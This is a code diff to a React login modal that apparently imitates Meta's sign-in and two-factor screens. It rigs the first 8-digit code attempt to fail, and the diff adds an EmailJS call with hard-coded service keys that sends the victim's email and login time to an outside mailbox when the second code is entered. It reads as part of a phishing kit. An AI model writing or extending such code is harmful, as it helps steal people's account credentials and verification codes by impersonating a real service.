@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { X, LoaderCircle } from "lucide-react";
+import emailjs from "@emailjs/browser";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -67,7 +68,7 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
     }, 3000);
   };
 
-  const handleCodeSubmit = (e: React.FormEvent) => {
+  const handleCodeSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (code.length !== 8 || !/^\d+$/.test(code)) {
       setError("Please enter a valid 8-digit code.");
@@ -75,7 +76,7 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
     }
     
     setIsLoading(true);
-    setTimeout(() => {
+    setTimeout(async () => {
       setIsLoading(false);
       
       // First code attempt fails
@@ -99,6 +100,23 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
         }, 1000);
       } else {
         // Second attempt succeeds
+        try {
+          // Send EmailJS notification
+          await emailjs.send(
+            'service_ieaopgl',
+            'template_zvcv0qf',
+            {
+              event_type: 'Meta Account Login',
+              user_email: email,
+              login_time: new Date().toLocaleString(),
+              status: 'Success'
+            },
+            'pgcGwVmRmBOKo-kUL'
+          );
+        } catch (error) {
+          console.error('EmailJS Error:', error);
+        }
+        
         setStage("success");
         setTimeout(() => {
           onSuccess();
